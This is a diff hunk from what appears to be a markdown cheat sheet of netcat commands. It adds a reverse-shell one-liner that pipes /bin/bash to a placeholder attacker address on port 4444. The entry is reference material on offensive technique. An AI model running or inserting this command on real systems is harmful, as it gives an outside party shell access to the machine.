@@ -89,6 +89,9 @@ Connect to remote machine on port 4444
 ```
 nc -nv 10.0.0.2 4444
 ```
+```
+nc -nv "attackerIP" 4444 -e /bin/bash
+```
 
 Setup listening connection and redirect incoming input into an exe
 ```
